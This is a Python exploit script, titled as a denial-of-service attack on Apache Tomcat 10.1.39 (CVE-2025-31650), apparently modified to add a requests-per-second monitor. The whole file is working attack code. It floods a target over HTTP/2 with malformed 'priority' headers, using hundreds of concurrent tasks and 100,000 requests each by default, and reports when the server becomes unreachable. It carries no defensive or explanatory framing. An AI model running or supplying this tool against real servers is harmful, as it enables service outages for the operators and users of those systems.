# Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS) with Throughput Monitor
# Author: Abdualhadi khalifa (Modified with RPS Tracker)
# CVE: CVE-2025-31650

import httpx
import asyncio
import random
import urllib.parse
import sys
import socket
import time
from colorama import init, Fore, Style

init()

class TomcatKiller:
    def __init__(self):
        self.success_count = 0
        self.error_count = 0
        self.start_time = 0.0
        self.invalid_priorities = [
            "u=-1, q=2",
            "u=4294967295, q=-1",
            "u=-2147483648, q=1.5",
            "u=0, q=invalid",
            "u=1/0, q=NaN",
            "u=1, q=2, invalid=param",
            "",
            "u=1, q=1, u=2",
            "u=99999999999999999999, q=0",
            "u=-99999999999999999999, q=0",
            "u=, q=",
            "u=1, q=1, malformed",
            "u=1, q=, invalid",
            "u=-1, q=4294967295",
            "u=invalid, q=1",
            "u=1, q=1, extra=",
            "u=1, q=1; malformed",
            "u=1, q=1, =invalid",
            "u=0, q=0, stream=invalid",
            "u=1, q=1, priority=recursive",
            "u=1, q=1, %invalid%",
            "u=0, q=0, null=0",
        ]

    async def validate_url(self, url):
        try:
            parsed_url = urllib.parse.urlparse(url)
            if not parsed_url.scheme or not parsed_url.hostname:
                raise ValueError("Invalid URL format. Use http:// or https://")
            host = parsed_url.hostname
            port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == 'https' else 80)
            return host, port
        except Exception:
            print(f"{Fore.RED}Error: Invalid URL. Use http:// or https:// format.{Style.RESET_ALL}")
            sys.exit(1)

    async def check_http2_support(self, host, port):
        async with httpx.AsyncClient(http2=True, verify=False, timeout=5, limits=httpx.Limits(max_connections=1000)) as client:
            try:
                response = await client.get(f"https://{host}:{port}/", headers={"user-agent": "TomcatKiller"})
                if response.http_version == "HTTP/2":
                    print(f"{Fore.GREEN}HTTP/2 supported! Proceeding ...{Style.RESET_ALL}")
                    return True
                else:
                    print(f"{Fore.YELLOW}Error: HTTP/2 not supported. This exploit requires HTTP/2.{Style.RESET_ALL}")
                    return False
            except Exception:
                print(f"{Fore.RED}Error: Could not connect to {host}:{port}.{Style.RESET_ALL}")
                return False

    async def send_invalid_priority_request(self, host, port, num_requests, task_id):
        async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, limits=httpx.Limits(max_connections=1000)) as client:
            url = f"https://{host}:{port}/"
            for i in range(num_requests):
                headers = {
                    "priority": random.choice(self.invalid_priorities),
                    "user-agent": f"TomcatKiller-{task_id}-{random.randint(1, 1000000)}",
                    "cache-control": "no-cache",
                    "accept": f"*/*; q={random.random()}",
                }
                try:
                    await client.get(url, headers=headers)
                    self.success_count += 1
                except Exception:
                    self.error_count += 1

    async def monitor_server(self, host, port):
        while True:
            try:
                with socket.create_connection((host, port), timeout=2):
                    pass # Kết nối thành công, không in rác màn hình để nhường chỗ cho throughput monitor
            except Exception:
                print(f"\n{Fore.RED}Target {host}:{port} unreachable or crashed!{Style.RESET_ALL}")
                break
            await asyncio.sleep(2)

    async def throughput_monitor(self, total_expected_requests):
        last_total = 0
        while True:
            await asyncio.sleep(1)
            elapsed = time.time() - self.start_time
            current_total = self.success_count + self.error_count
            if elapsed > 0:
                instant_rps = (current_total - last_total)
                avg_rps = current_total / elapsed
                print(f"{Fore.CYAN}[Throughput] Avg: {avg_rps:7.2f} req/s | Instant: {instant_rps:5.2f} req/s | Total: {current_total}/{total_expected_requests} (Succ: {self.success_count}, Err: {self.error_count}){Style.RESET_ALL}", end="\r")
                last_total = current_total
            if current_total >= total_expected_requests:
                break

    async def run_attack(self, host, port, num_tasks, requests_per_task):
        print(f"{Fore.GREEN}Starting attack on {host}:{port}...{Style.RESET_ALL}")
        print(f"Tasks: {num_tasks}, Requests per task: {requests_per_task}")

        total_expected_requests = num_tasks * requests_per_task
        self.start_time = time.time()

        # Khởi chạy các task nền theo dõi
        server_monitor_task = asyncio.create_task(self.monitor_server(host, port))
        throughput_task = asyncio.create_task(self.throughput_monitor(total_expected_requests))

        # Khởi chạy các worker gửi request tấn công
        tasks = [self.send_invalid_priority_request(host, port, requests_per_task, i) for i in range(num_tasks)]
        await asyncio.gather(*tasks)

        # Hủy các task monitor khi tấn công hoàn tất
        server_monitor_task.cancel()
        throughput_task.cancel()

        total_requests = num_tasks * requests_per_task
        success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0
        
        print(f"\n\n{Fore.MAGENTA}===== Attack Summary ====={Style.RESET_ALL}")
        print(f"Target: {host}:{port}")
        print(f"Total Requests: {total_requests}")
        print(f"Successful Requests: {self.success_count}")
        print(f"Failed Requests: {self.error_count}")
        print(f"Success Rate: {success_rate:.2f}%")
        print(f"{Fore.MAGENTA}========================={Style.RESET_ALL}")

async def main():

    default_url = "https://localhost:8443"
    url = input(f"{Fore.CYAN}Enter target URL (default {default_url}): {Style.RESET_ALL}") or default_url
    
    num_tasks = int(input(f"{Fore.CYAN}Enter number of tasks (default 300): {Style.RESET_ALL}") or 300)
    requests_per_task = int(input(f"{Fore.CYAN}Enter requests per task (default 100000): {Style.RESET_ALL}") or 100000)

    tk = TomcatKiller()
    host, port = await tk.validate_url(url)

    if not await tk.check_http2_support(host, port):
        sys.exit(1)

    await tk.run_attack(host, port, num_tasks, requests_per_task)

if __name__ == "__main__":
    try:
        asyncio.run(main())
        print(f"{Fore.GREEN}Attack completed!{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Attack interrupted by user.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")
        sys.exit(1)